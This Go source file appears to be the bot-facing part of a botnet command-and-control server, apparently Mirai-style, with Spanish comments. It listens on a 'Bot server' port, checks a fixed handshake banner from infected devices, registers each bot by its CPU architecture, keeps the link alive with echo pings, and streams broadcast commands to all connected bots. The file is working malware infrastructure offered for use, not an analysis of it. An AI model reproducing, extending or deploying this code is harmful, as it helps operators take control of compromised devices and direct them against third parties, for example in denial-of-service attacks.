package main

import (
	"log"
	"net"
	"time"
)

// Slave will start the main slave process
func Slave() error {
	listener, err := net.Listen(Options.Templates.Slaves.Protocol, Options.Templates.Slaves.Listener)
	if err != nil {
		return err
	}

	log.Printf("\x1b[48;5;10m\x1b[38;5;16m Success \x1b[0m Bot server started on port > [%s]\r\n", Options.Templates.Slaves.Listener)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go Handle(conn)
	}
}

type Client struct {
	CID     int
	Version byte
	Source  string
	Arch    string // <-- NUEVO: arquitectura del bot
	Conn    net.Conn
	Stream  chan []byte
}

// Handle will handle the new possible device connection.

func Handle(conn net.Conn) {
	defer conn.Close()

	time.Sleep(1 * time.Second)

	// Leer handshake: 4 bytes banner + 1 byte len + hasta 64 de arquitectura
	buf := make([]byte, 4+1+64)
	n, err := conn.Read(buf)
	if err != nil || n < 5 {
		return
	}

	// Verificar banner
	for i, block := range Banner {
		if i >= n || buf[i] != block {
			return
		}
	}

	// Leer longitud de la arquitectura
	archLen := int(buf[4])
	if archLen < 1 || archLen > 64 || 5+archLen > n {
		// No hay suficientes datos -> cerrar conexión
		return
	}
	arch := string(buf[5 : 5+archLen])

	// Crear cliente con arquitectura
	New := &Client{
		Conn:    conn,
		Stream:  make(chan []byte),
		Source:  arch, // también puedes guardarlo en Source si quieres
		Arch:    arch, // campo específico
		Version: 0,    // no usamos versión
	}

	AddClient(New)
	defer RemoveClient(New)

	ticker := time.NewTicker(time.Second)
	cancel := make(chan bool)
	conns := 0

	for {
		select {
		case n := <-cancel:
			if !n {
				continue
			}
			return
		case <-ticker.C:
			conn.SetReadDeadline(time.Now().Add(120 * time.Second))
			if conns > 0 {
				continue
			}
			go func(conn net.Conn) {
				conns++
				defer func() { conns-- }()
				buf := make([]byte, 1)
				conn.SetReadDeadline(time.Now().Add(180 * time.Second))
				if _, err := conn.Read(buf); err != nil {
					cancel <- true
					return
				}
				conn.SetReadDeadline(time.Now().Add(120 * time.Second))
				if _, err := conn.Write(buf); err != nil {
					cancel <- true
					return
				}
			}(conn)
		case broadcast := <-New.Stream:
			if _, err := conn.Write(broadcast); err != nil {
				return
			}
		}
	}
}
